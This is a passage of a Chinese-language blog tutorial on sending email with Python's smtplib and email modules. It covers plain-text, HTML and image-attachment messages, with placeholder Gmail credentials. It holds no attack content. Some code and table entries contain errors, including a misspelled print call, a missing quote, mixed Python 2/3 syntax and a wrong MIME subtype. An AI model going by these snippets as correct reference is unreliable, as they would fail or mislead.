class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>smtplib.SMTP</code>的操作方法如下:</p><table><thead><tr><th>方法</th><th>含义</th></tr></thead><tbody><tr><td><code>SMTP.set_debuglevel(level)</code></td><td>设置是否是调试模式，默认为false，表示不输出任何调试信息</td></tr><tr><td><code>SMTP.connect([host[,port]])</code></td><td>连接到指定的smtp服务器，参数表示smtp主机和端口<br>注意：可以在host参数中指定端口号(eg:smtp.yeah.net:25),这样就不用给出port参数</td></tr><tr><td><code>SMTP.docmd(cmd[,argsring])</code></td><td>向smtp服务器发送指令。可选参数argsring表示执行的参数</td></tr><tr><td><code>SMTP.hello([hostname])</code></td><td>使用’helo’指令向服务器确认身份，相当于告诉smtp服务器’who am I’</td></tr><tr><td><code>SMTP.has_extn(name)</code></td><td>判断指定名称在服务器邮件列表中是否存在。出入安全考虑，smtp服务器往往屏蔽了该指令</td></tr><tr><td><code>SMTP.verify(address)</code></td><td>判断指定邮件地址是否在服务器中存在。出于安全考虑，smtp服务器往往屏蔽了该令。</td></tr><tr><td><code>SMTP.login(user,password)</code></td><td>登陆服务器</td></tr><tr><td><code>SMTP.sendmail(from_addr,to_addr,msg[,mail_options,rcpt_options])</code></td><td>发送邮件。这里要注意一下第三个参数，msg是字符串，表示邮件。我们知道邮件一般由标题，发信人，收件人，邮件内容，附件等构成，发送邮件的时候，要注意msg的格式。这个格式就是smtp协议中定义的格式。</td></tr><tr><td><code>SMTP.quit()</code></td><td>断开于smtp服务器的连接</td></tr></tbody></table></blockquote><h4 id="2-email模块"><a href="#2-email模块" class="headerlink" title="2.email模块"></a>2.<code>email</code>模块</h4><blockquote><p>email模块是用来处理邮件消息，包括MIME和其他基于RFC 2822 的消息文档。使用这些模块来定义邮件的内容</p><table><thead><tr><th>名称</th><th>内容</th></tr></thead><tbody><tr><td><code>class email.mime.base.MIMEBase(_maintype,_subtype, **_params )</code></td><td>这是MIME的一个基类_maintype是内容类型(eg:text or image)_subtype是内容的minor type类型(eg:plain or gif) **_params是一个字典，直接传递给Message.add_header()。</td></tr><tr><td><code>class email.mine.multipart.MIMEMultipart([_subtype[,&lt;/br&gt;boundary[,_subparts[,&lt;/br&gt;_params]]]])&lt;/br&gt;</code></td><td>MIMEBase的一个子类多个MIME对象的集合，_subtype默认值为mixed。boundary是MIMEMultipart的边界，默认边界是可数的。</td></tr><tr><td><code>class email.mime.application.MIMEApplication(_data[,_subtype[, _encoder[,**_params]]])</code></td><td>MIMEMultipart的一个子类</td></tr><tr><td><code>class email.mime.audio.MIMEAudio(_audiodata[,_subtype[,_encoder[,&lt;/br&gt; **_params]]])</code></td><td>MIME音频对象</td></tr><tr><td><code>class email.mime.image.MIMEImage(_imagedata[,_subtype[,&lt;/br&gt; _encoder[,&lt;/br&gt; **_params]]])</code></td><td>MIME二进制对象</td></tr><tr><td><code>class email.mime.message.MIMEMessage(_msg[,_subtype])</code></td><td>具体的一个message实例</td></tr><tr><td><code>class email.mime.text.MIMEText(_text[,_subtype[,&lt;_charset]])</code></td><td>MIME文本对象，其中_text是邮件内容，_subtype邮件类型，可以是text/plain（普通文本邮件），html/plain(html邮件), _charset编码，可以是gb2312,utf-8等等。</td></tr></tbody></table></blockquote><h4 id="3-发送邮件"><a href="#3-发送邮件" class="headerlink" title="3.发送邮件"></a>3.发送邮件</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#Python对SMTP支持有smtlib 和email 2个函数，email负责构造函数，smtplib负责发送函数</span><span class="token comment" spellcheck="true">#导入发送函数smtplib</span><span class="token keyword">import</span> smtplib<span class="token comment" spellcheck="true">#导入邮件构造函数email</span><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token comment" spellcheck="true">#设置服务器所需信息</span><span class="token comment" spellcheck="true">#gmail服务器的smtp地址</span>mail_host <span class="token operator">=</span> <span class="token string">'smtp.gmail.com'</span><span class="token comment" spellcheck="true">#gmail用户名</span>mail_user <span class="token operator">=</span> <span class="token string">'jack'</span><span class="token comment" spellcheck="true">#密码(部分邮箱为授权码)</span>mail_pass <span class="token operator">=</span> <span class="token string">'xxxxxxxx'</span><span class="token comment" spellcheck="true">#邮件发送方邮箱地址</span>sender <span class="token operator">=</span> <span class="token string">'jack@gmail.com'</span><span class="token comment" spellcheck="true">#邮件接受方邮箱地址，注意需要[]包裹，这意味着你可以写多个邮件地址群发</span>receivers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'185@163.com'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#设置email信息</span><span class="token comment" spellcheck="true">#邮件内容设置</span><span class="token triple-quoted-string string">'''纯文本内容发送message = MIMEText('content','plain','utf-8')'''</span><span class="token comment" spellcheck="true">#邮件主题</span>message<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> u<span class="token string">'这是来自gmail的Python测试邮件'</span><span class="token comment" spellcheck="true">#发送方信息</span>message<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> sender<span class="token comment" spellcheck="true">#接受方信息</span>message<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> receivers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#message[‘To’]接受的字符串而不是list，如果有多个，可以用逗号隔开</span><span class="token comment" spellcheck="true">#登录并发送邮件</span><span class="token keyword">try</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true">#使用ssl加密传输数据</span>  smtpObj <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP_SSL<span class="token punctuation">(</span>mail_host<span class="token punctuation">,</span><span class="token number">465</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#连接到服务器</span>  <span class="token comment" spellcheck="true">#smtpObj.connect(mail_host,25)</span>  <span class="token comment" spellcheck="true">#登录到服务器</span>  smtpObj<span class="token punctuation">.</span>login<span class="token punctuation">(</span>mail_user<span class="token punctuation">,</span>mail_pass<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#发送</span>   <span class="token comment" spellcheck="true">#SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]</span>   <span class="token comment" spellcheck="true"># from_addr 邮件发送者地址</span>   <span class="token comment" spellcheck="true"># to_addr 邮件接受者 地址</span>   <span class="token comment" spellcheck="true"># msg：发送的消息，这里发送的是字符串，表示邮件，可以用，as_string转换成字符串</span>   smtpObj<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span> sender<span class="token punctuation">,</span>receivers<span class="token punctuation">,</span>message<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#退出</span>   smtpObj<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token keyword">except</span> smtplib<span class="token punctuation">.</span>SMTPException <span class="token keyword">as</span> e<span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#打印错误</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>流程</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-20/1603199467877-10320.png" alt="10320"></p></blockquote><h4 id="4-发送富文本邮件"><a href="#4-发送富文本邮件" class="headerlink" title="4.发送富文本邮件"></a>4.发送富文本邮件</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#Python对SMTP支持有smtlib 和email 2个函数，email负责构造函数，smtplib负责发送函数</span><span class="token comment" spellcheck="true">#导入发送函数smtplib</span><span class="token keyword">import</span> smtplib<span class="token comment" spellcheck="true">#导入邮件构造函数email</span><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token comment" spellcheck="true">#设置服务器所需信息</span><span class="token comment" spellcheck="true">#gmail服务器的smtp地址</span>mail_host <span class="token operator">=</span> <span class="token string">'smtp.gmail.com'</span><span class="token comment" spellcheck="true">#gmail用户名</span>mail_user <span class="token operator">=</span> <span class="token string">'jack'</span><span class="token comment" spellcheck="true">#密码(部分邮箱为授权码)</span>mail_pass <span class="token operator">=</span> <span class="token string">'xxxx'</span><span class="token comment" spellcheck="true">#邮件发送方邮箱地址</span>sender <span class="token operator">=</span> <span class="token string">'jack@gmail.com'</span><span class="token comment" spellcheck="true">#邮件接受方邮箱地址，注意需要[]包裹，这意味着你可以写多个邮件地址群发</span>receivers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'185@163.com'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#设置email信息</span><span class="token comment" spellcheck="true">#邮件内容设置</span><span class="token triple-quoted-string string">'''纯文本内容发送message = MIMEText('content','plain','utf-8')'''</span><span class="token comment" spellcheck="true">#发送富文本内容</span><span class="token comment" spellcheck="true">#MIMEText,第一个参数是邮件正文，第二个参数是MIME的subtype</span><span class="token comment" spellcheck="true">#最后一个是用 utf-8编码保证多语言兼容性</span>message <span class="token operator">=</span> MIMEText<span class="token punctuation">(</span><span class="token string">'&lt;html>&lt;body>&lt;h1>Hello&lt;/h1>'</span> <span class="token operator">+</span><span class="token string">'&lt;p>send by &lt;a href="http://www.python.org">Python&lt;/a>...&lt;/p>'</span> <span class="token operator">+</span><span class="token string">'&lt;/body>&lt;/html>'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#邮件主题</span>message<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> u<span class="token string">'这是来自gmail的Python测试邮件'</span><span class="token comment" spellcheck="true">#发送方信息</span>message<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> sender<span class="token comment" spellcheck="true">#接受方信息</span>message<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> receivers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#message[‘To’]接受的字符串而不是list，如果有多个，可以用逗号隔开</span><span class="token comment" spellcheck="true">#登录并发送邮件</span><span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#使用ssl加密传输数据</span>        smtpObj <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP_SSL<span class="token punctuation">(</span>mail_host<span class="token punctuation">,</span><span class="token number">465</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#连接到服务器</span>        <span class="token comment" spellcheck="true">#smtpObj.connect(mail_host,25)</span>        <span class="token comment" spellcheck="true">#登录到服务器</span>        smtpObj<span class="token punctuation">.</span>login<span class="token punctuation">(</span>mail_user<span class="token punctuation">,</span>mail_pass<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#发送</span>        <span class="token comment" spellcheck="true">#SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]</span>        <span class="token comment" spellcheck="true"># from_addr 邮件发送者地址</span>        <span class="token comment" spellcheck="true"># to_addr 邮件接受者 地址</span>        <span class="token comment" spellcheck="true"># msg：发送的消息，这里发送的是字符串，表示邮件，可以用，as_string转换成字符串</span>          smtpObj<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>         sender<span class="token punctuation">,</span>receivers<span class="token punctuation">,</span>message<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">#退出</span>         smtpObj<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> smtplib<span class="token punctuation">.</span>SMTPException <span class="token keyword">as</span> e<span class="token punctuation">:</span>     pritnt<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-发送点图片附件"><a href="#5-发送点图片附件" class="headerlink" title="5.发送点图片附件"></a>5.发送点图片附件</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#</span><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token keyword">import</span>  smtplib<span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">from</span> email <span class="token keyword">import</span>  encoders<span class="token keyword">from</span> email<span class="token punctuation">.</span>header <span class="token keyword">import</span> Header<span class="token keyword">from</span>  email<span class="token punctuation">.</span>utils <span class="token keyword">import</span> parseaddr<span class="token punctuation">,</span> formataddr<span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart <span class="token keyword">import</span> MIMEMultipart<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>base <span class="token keyword">import</span> MIMEBase<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>image <span class="token keyword">import</span>  MIMEImage<span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">def</span> <span class="token function">_format_addr</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>name<span class="token punctuation">,</span> addr <span class="token operator">=</span> parseaddr<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">return</span>  formataddr<span class="token punctuation">(</span><span class="token punctuation">(</span> \Header<span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \addr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>unicode<span class="token punctuation">)</span> <span class="token keyword">else</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>mail_host <span class="token operator">=</span> <span class="token string">'smtp.gmail.com'</span>mail_user <span class="token operator">=</span> <span class="token string">'jack'</span>mail_pass <span class="token operator">=</span> <span class="token string">'2008'</span><span class="token comment" spellcheck="true">#</span>sender <span class="token operator">=</span> <span class="token string">'jack@gmail.com'</span>receivers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'185@163.com'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#设置email信息</span><span class="token comment" spellcheck="true">#添加一个MIMEmultipart类，处理正文及附件</span>messages <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#messages = MIMEText('python for mail','plain','utf-8')</span>messages<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> _format_addr<span class="token punctuation">(</span> u<span class="token string">'Python爱好者 &lt;%s> '</span> <span class="token operator">%</span> sender <span class="token punctuation">)</span>messages<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> _format_addr<span class="token punctuation">(</span> u<span class="token string">'管理员 &lt;%s> '</span> <span class="token operator">%</span> receivers<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>messages<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span>  Header<span class="token punctuation">(</span> u<span class="token string">'这是一份带附件的python邮件测试'</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#</span><span class="token comment" spellcheck="true">#邮件正文</span>messages<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>MIMEText<span class="token punctuation">(</span><span class="token string">'&lt;html>&lt;body>&lt;h1>Hello&lt;/h1>'</span> <span class="token operator">+</span><span class="token string">'&lt;p>send by &lt;a href="http://www.python.org">Python&lt;/a>...&lt;/p>'</span> <span class="token operator">+</span><span class="token string">'&lt;p>&lt;img src="cid:0">&lt;/p>'</span> <span class="token operator">+</span><span class="token string">'&lt;/body>&lt;/html>'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span class="token keyword">with</span> open<span class="token punctuation">(</span>u<span class="token string">'test.png'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>     <span class="token comment" spellcheck="true">#设置附件的MIME和文件名，这是png类型</span>     mime <span class="token operator">=</span> MIMEBase<span class="token punctuation">(</span><span class="token string">'image'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span>filename<span class="token operator">=</span><span class="token string">'test.png'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#加上必要的头信息</span>     mime<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">,</span><span class="token string">'attachemen'</span><span class="token punctuation">,</span>filename<span class="token operator">=</span><span class="token string">'test.png'</span><span class="token punctuation">)</span>     mime<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'Content-ID'</span><span class="token punctuation">,</span><span class="token string">'&lt;0>'</span><span class="token punctuation">)</span>     mime<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'X-Attachment-Id'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#把附件内容读进来</span>     mime<span class="token punctuation">.</span>set_payload<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#用Base64编码</span>     encoders<span class="token punctuation">.</span>encode_base64<span class="token punctuation">(</span>mime<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#添加到MIMEutipart</span>     messages<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>mime<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#</span>     <span class="token keyword">try</span><span class="token punctuation">:</span>             smtpObj <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP_SSL<span class="token punctuation">(</span>mail_host<span class="token punctuation">,</span><span class="token number">465</span><span class="token punctuation">)</span>             smtpObj<span class="token punctuation">.</span>login<span class="token punctuation">(</span>mail_user<span class="token punctuation">,</span>mail_pass<span class="token punctuation">)</span>             smtpObj<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>sender<span class="token punctuation">,</span>receivers<span class="token punctuation">,</span>messages<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token keyword">print</span><span class="token punctuation">(</span> u<span class="token string">'邮件发送成功'</span><span class="token punctuation">)</span>             smtpObj<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token keyword">except</span> smtplib<span class="token punctuation">.</span>SMTPException <span class="token keyword">as</span> e<span class="token punctuation">:</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="6-发送带附件的电子邮件-定义为类"><a href="#6-发送带附件的电子邮件-定义为类" class="headerlink" title="6.发送带附件的电子邮件(定义为类)"></a>6.发送带附件的电子邮件(定义为类)</h4><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>multipart <span class="token keyword">import</span> MIMEMultipart<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>image <span class="token keyword">import</span> MIMEImage<span class="token keyword">from</span> email<span class="token punctuation">.</span>header <span class="token keyword">import</span> Header<span class="token keyword">import</span> smtplib<span class="token keyword">def</span> <span class="token function">sendEmail</span><span class="token punctuation">(</span>authInfo<span class="token punctuation">,</span> fromAdd<span class="token punctuation">,</span> toAdd<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> plainText<span class="token punctuation">)</span><span class="token punctuation">:</span>strFrom <span class="token operator">=</span> fromAddstrTo <span class="token operator">=</span> <span class="token string">'; '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>toAdd<span class="token punctuation">)</span>server <span class="token operator">=</span> authInfo<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'server'</span><span class="token punctuation">)</span>smtpPort <span class="token operator">=</span> <span class="token number">25</span>sslPort <span class="token operator">=</span> <span class="token number">465</span>user <span class="token operator">=</span> authInfo<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span>passwd <span class="token operator">=</span> authInfo<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token operator">not</span> <span class="token punctuation">(</span>server <span class="token operator">and</span> user <span class="token operator">and</span> passwd<span class="token punctuation">)</span> <span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'incomplete login info, exit now'</span><span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true"># 设定root信息</span>msgRoot <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token string">'related'</span><span class="token punctuation">)</span>msgRoot<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span> <span class="token operator">=</span> subjectmsgRoot<span class="token punctuation">[</span><span class="token string">'From'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'%s&lt;%s>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>Header<span class="token punctuation">(</span><span class="token string">'测试'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> strFrom<span class="token punctuation">)</span>msgRoot<span class="token punctuation">[</span><span class="token string">'To'</span><span class="token punctuation">]</span> <span class="token operator">=</span> strTo<span class="token comment" spellcheck="true"># 邮件正文内容</span>msgText <span class="token operator">=</span> MIMEText<span class="token punctuation">(</span>plainText<span class="token punctuation">,</span> <span class="token string">'plain'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span>msgRoot<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>msgText<span class="token punctuation">)</span>msgAlternative <span class="token operator">=</span> MIMEMultipart<span class="token punctuation">(</span><span class="token string">'alternative'</span><span class="token punctuation">)</span>msgRoot<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>msgAlternative<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># mail_msg = </span><span class="token triple-quoted-string string">"""#         &lt;p>Python 邮件发送测试...&lt;/p>#         &lt;p>&lt;a href="http://www.runoob.com">菜鸟教程链接&lt;/a>&lt;/p>#         &lt;p>图片演示：&lt;/p>#         &lt;p>&lt;img src="cid:pic_attach">&lt;/p># """</span><span class="token comment" spellcheck="true"># msgAlternative.attach(MIMEText(mail_msg, 'html', 'utf-8'))</span><span class="token comment" spellcheck="true">#设定内置图片信息</span>fp <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'aa.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>msgImage <span class="token operator">=</span> MIMEImage<span class="token punctuation">(</span>fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>msgImage<span class="token punctuation">[</span><span class="token string">"Content-Type"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'application/octet-stream'</span><span class="token comment" spellcheck="true">#filename可自定义，供邮件中显示</span>msgImage<span class="token punctuation">[</span><span class="token string">"Content-Disposition"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename="aa.png"'</span>fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>msgImage<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'Content-ID'</span><span class="token punctuation">,</span> <span class="token string">'&lt;pic_attach>'</span><span class="token punctuation">)</span>msgAlternative<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>msgImage<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#发送邮件</span>smtp <span class="token operator">=</span> smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>smtp<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server<span class="token punctuation">,</span> smtpPort<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#ssl加密方式，通信过程加密，邮件数据安全</span><span class="token comment" spellcheck="true"># smtp = smtplib.SMTP_SSL()</span><span class="token comment" spellcheck="true"># smtp.connect(server, sslPort)</span><span class="token comment" spellcheck="true">#设定调试级别，依情况而定</span><span class="token comment" spellcheck="true"># smtp.set_debuglevel(1)</span>smtp<span class="token punctuation">.</span>login<span class="token punctuation">(</span>user<span class="token punctuation">,</span> passwd<span class="token punctuation">)</span>smtp<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>strFrom<span class="token punctuation">,</span> toAdd<span class="token punctuation">,</span> msgRoot<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>smtp<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"邮件发送成功!"</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"失败："</span><span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span> <span class="token punctuation">:</span>authInfo <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>authInfo<span class="token punctuation">[</span><span class="token string">'server'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'smtp.gmail.com'</span>authInfo<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'jack'</span>authInfo<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'2008'</span>fromAdd <span class="token operator">=</span> jack2573270182@gmail<span class="token punctuation">.</span>com'toAdd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'185@163.com'</span><span class="token punctuation">]</span>subject <span class="token operator">=</span> <span class="token string">'Email Subject'</span>plainText <span class="token operator">=</span> <span class="token string">'Email Content'</span>sendEmail<span class="token punctuation">(</span>authInfo<span class="token punctuation">,</span> fromAdd<span class="token punctuation">,</span> toAdd<span class="token punctuation">,</span> subject<span class="token punctuation">,</span> plainText<span class="token punctuation">)</span><span aria-hidden="true" 